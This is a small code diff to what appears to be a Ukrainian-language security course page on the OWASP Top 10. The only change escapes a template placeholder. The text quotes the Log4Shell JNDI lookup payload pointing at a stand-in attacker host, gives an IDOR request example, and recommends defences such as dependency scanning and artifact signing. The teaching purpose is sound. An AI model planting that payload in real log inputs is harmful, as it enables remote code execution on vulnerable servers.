@@ -2211,7 +2211,7 @@ jobs:
 
           // 3 — OWASP Top 10
           `<h4>OWASP Top 10 (2021) — деталі</h4>
-<p><strong>A01 Broken Access Control</strong> (94% застосунків) — вперше перше місце у 2021. IDOR: <code>GET /api/users/1042</code> повертає дані іншого користувача без перевірки прав. <strong>A06 Vulnerable Components</strong>: Log4Shell (CVE-2021-44228, CVSS 10.0) — бібліотека Apache Log4j2, вектор <code>${jndi:ldap://attacker.com/exploit}</code> у будь-якому лог-повідомленні → RCE. Потребує систематичного SCA (Trivy, Snyk, OWASP Dependency-Check).</p>
+<p><strong>A01 Broken Access Control</strong> (94% застосунків) — вперше перше місце у 2021. IDOR: <code>GET /api/users/1042</code> повертає дані іншого користувача без перевірки прав. <strong>A06 Vulnerable Components</strong>: Log4Shell (CVE-2021-44228, CVSS 10.0) — бібліотека Apache Log4j2, вектор <code>\${jndi:ldap://attacker.com/exploit}</code> у будь-якому лог-повідомленні → RCE. Потребує систематичного SCA (Trivy, Snyk, OWASP Dependency-Check).</p>
 <p><strong>A10 SSRF</strong> — нова категорія 2021. Capital One 2019: SSRF → AWS IMDS v1 → IAM credentials → 100M+ записів клієнтів. <strong>A08 Software Integrity Failures</strong>: SolarWinds 2020 — компрометація CI/CD pipeline; XZ Utils 2024 — бекдор у liblzma. Підписання артефактів збірки та SBOM — обов'язкові.</p>`,
 
           // 4 — Ін'єкції
